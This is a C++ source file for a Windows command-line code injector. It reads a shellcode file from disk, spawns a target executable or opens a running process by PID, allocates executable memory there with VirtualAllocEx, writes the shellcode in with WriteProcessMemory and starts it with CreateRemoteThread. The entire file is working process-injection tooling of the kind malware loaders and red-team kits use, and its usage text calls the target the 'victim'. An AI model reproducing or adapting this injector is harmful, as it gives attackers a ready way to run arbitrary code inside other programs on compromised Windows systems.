/*
LICENSE INFORMATION

Copyright 2020 Kaizen Cyber Ops, LLC.

File Name: CodeInjector.cpp
Associated File(s): CodeInector.h

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

https://opensource.org/licenses/MIT
*/
#include "CodeInjector.h"


int main(int argc, char* argv[])
{
	Stage();

	cout << "Insepcting cli agruments..." << endl;
	ProcessArgs(argv, argc);
	
	cout << "Reading shellcode..." << endl;
	ReadShellCode();

	cout << "Done.\nPreparing the victim for injection.." << endl;
	PrepareVictim();

	cout << "Done.\nInjecting shellcode into process..." << endl;
	InjectAndX();


	cout << "Done.\nShellcode should be executing"<< endl;
	system("PAUSE");

	CleanUp();
	return 0;
}

void Stage()
{
	pInfo = (InjectorInfo*)malloc(sizeof(InjectorInfo));
	ZeroMemory(pInfo, sizeof(InjectorInfo));
	args = (char**)malloc(sizeof(char*) * ARGC);  //begin to copy argv into global variable args
	ZeroMemory(args, sizeof(char**));
}

void ProcessArgs(char* argv[], int argc)
{
	if (argc != ARGC)//check args length
		FailureAndExit((char*)("incorrect number of arguments, see usage examples below"));
	else
	{
		
		for (size_t i = 0; i < ARGC; i++)  //process each argument in argv and copy
		{
			int len = strlen(argv[i]) + 1;
			args[i] = (char*)malloc(len);
			ZeroMemory(args[i], len);
			memcpy(args[i], argv[i], len);
		}
	}
	if (_stricmp(args[1], "-f") != 0 && _stricmp(args[1], "-p") != 0)  //ensure that argument flag is present and valid
		FailureAndExit((char*)("you did not supply a file location or a pid in the correct format.  see below for usage examples", 0));
	CheckFile(3);		//check the shellcode file for presence and read rights
	if (0 == _strcmpi(args[1], "-f"))//check the victim executable to see if we have permissions to run
	{
		CheckFile(2);
		pInfo->inject_using_pid = false;
		
		char target[5] = ".exe";
		char ext[5] = "\x0\x0\x0\x0";
		strncpy_s(ext, args[2] + strlen(args[2]) - 4, 4);
		for (size_t i = 0; i < 5;i++)
			ext[i] = tolower(ext[i]);
		if (0 != _strcmpi(ext, target))
			FailureAndExit((char*)("The supplied victim executable: ", args[2], " does not ahve a .exe extension"));
	}
	else	
		try		//Check if PID arg is valid
	{
		atoi(args[2]);
		pInfo->inject_using_pid = true;
	}
	catch (exception e) { FailureAndExit((char*)("The supplied pid: ", args[2], " was understood as an integer")); }
	return;
}

void ReadShellCode()
{
	OFSTRUCT binOF;
	HANDLE h;
	DWORD read;
	DWORD size = 0;	//low order file size DWORD
	DWORD ovf = 0;	//high order file size DWORD
	if (NULL == (h = (HANDLE)OpenFile(args[3], &binOF, OF_READ)))	//try to get a handle on the shellcode file
		FailureAndExit((char*)("Error while attempting to open the binary file"));
	size = GetFileSize(h, &ovf);
	if (ovf != 0)	//make sure the shellcode isnt excessively large
		FailureAndExit((char*)("The shell code size is much to big, it is ", (size + (UINT64)(ovf << 32)), " bytes"));
	pInfo->shellcode_size = size;
	pInfo->shellcode_bytes = new char[pInfo->shellcode_size];
	if (!ReadFile(h, pInfo->shellcode_bytes, pInfo->shellcode_size, &read, NULL))	//read bytes from shellcode file
		FailureAndExit((char*)("Could not read shellcode from file."));
	if (read != pInfo->shellcode_size)	//ensure entire file was read
		FailureAndExit((char*)("Incomplete file read.  Could only read ", read, "/", pInfo->shellcode_size, " bytes from shellcode."));
	return;
}

void PrepareVictim()
{
	if (pInfo->inject_using_pid)
		GetHandleOfRunningProc();
	else
		SpawnProc();
	return;
}
void GetHandleOfRunningProc()
{
	if (NULL == (pInfo->victimH = new HANDLE(OpenProcess(PROCESS_ALL_ACCESS, false, atoi(args[2])))))
		FailureAndExit((char*)("**Unable to get a handle on the victim process.**\n**This action requires the SeDebugPrivilege**"));
	return;
}
void SpawnProc( )
{
	PROCESS_INFORMATION* pPI = (PROCESS_INFORMATION*)malloc( sizeof( PROCESS_INFORMATION));
	LPSTARTUPINFOA pSUI = (LPSTARTUPINFOA)malloc(sizeof(STARTUPINFOA));
	ZeroMemory(pPI, sizeof(PROCESS_INFORMATION));
	ZeroMemory(pSUI, sizeof(STARTUPINFOA));
	if (!CreateProcessA(NULL, args[2], NULL, NULL, NULL, NULL, NULL, NULL, pSUI,pPI))	//spawn the process
		FailureAndExit((char*)("Unable to spawn the remote process"));
	memcpy(&pInfo->victimH, &pPI->hProcess, sizeof(HANDLE));
	free(pPI);
	free(pSUI);
	return;
}

void InjectAndX( )
{
	size_t writen = 0;
	LPVOID write_address = NULL;

	if (NULL == (write_address = VirtualAllocEx(pInfo->victimH, NULL, pInfo->shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))	//allocate some memory for the remote proc
		FailureAndExit((char*)("**Unable to carve out memory in the victim process.**"));

	memcpy(&pInfo->injected_code_address, &write_address, sizeof(LPVOID));
	if (!WriteProcessMemory(pInfo->victimH, pInfo->injected_code_address, pInfo->shellcode_bytes, pInfo->shellcode_size, &writen))	//write the shellcode into remote mem
		FailureAndExit( (char*)("Unable to write shellcode into the memory of the victim process\x0"));

	if (writen == 0)
		FailureAndExit((char*)( "Unable to write all the shellcode into process.  Wrote " ,(int)writen, "/",(int)pInfo->shellcode_size, " bytes"));

	cout << "wrote 0x" << hex << writen << " bytes into process memory, executing now..." << endl;
	if (!CreateRemoteThread(pInfo->victimH, NULL, NULL, (LPTHREAD_START_ROUTINE)pInfo->injected_code_address, NULL, NULL, NULL))//execute the shellcode
		FailureAndExit((char*)("The program failed while attempting to call the remote thread. "));

	return;
}

void CheckFile(int index)	//do a few checks to make sure that we can get a read handle on the file
{
	try
	{
		HFILE h = 0;
		OFSTRUCT* t = (OFSTRUCT*)malloc(sizeof(OFSTRUCT));
		ZeroMemory(t, sizeof(OFSTRUCT));
		if (HFILE_ERROR == (h = OpenFile(args[index], t, OF_READ)) || h == 0)
			FailureAndExit((char*)("Failure trying to get file attributes for file ", args[index]));
		CloseHandle((HANDLE)h);
		free(t);
	}
	catch (exception e)
	{
		FailureAndExit((char*)("Failure trying to get file attributes for file ", args[index]));
	}
	return;
}

void FailureAndExit(char* msg) //called when a failure occures
{
	cout << "\n***" << msg << "***\n***" << "Error Code: 0x" << hex << GetLastError() << "\n\n";
	cout << "This program will read a binary from disk and then inject it into another process using CreateRemoteProcess and CreateRemoteThread\n\nSyntax:\n\tCodeInjector.exe [-f|-p] [arg] [shellcode-file]\n\nFlags:\n\n\t-f\tSpawn a new program and inject shellcode into the newly created executable.  Arg specifies the path of the target victim executable.\n\t-p\tSpecify that the shellcode will be injected into a currently running process.  Requires SeDebugPrivilege.  Arg specifies the pid of the target victim process.\n\nUsage:\n\tCodeInjector.exe [(-f [path-to-executable])|(-p [process pid])] [path-to-shellcode]\n\nExample:\n\n\tTo spawn cmd.exe process and inject:\n\t\tCodeInjector.exe -f C:\\Windows\\System32\\Cmd.exe .\\shellcode.bin\n\n\tTo inject into existing process #1867:\n\t\tCodeInjector.exe -p 1867 .\\shellcode.bin\n\n" << endl;
	cout << "***Exiting...***\n" << endl;
	CleanUp();
	system("PAUSE");
	exit(1);
}

void CleanUp()
{
	free(pInfo);
	for (size_t i = 0; i < ARGC; i++)	//free any char* that may have been reserved on heap
		if (&args[i] != NULL)
			free(args[i]);
	free(args);
}






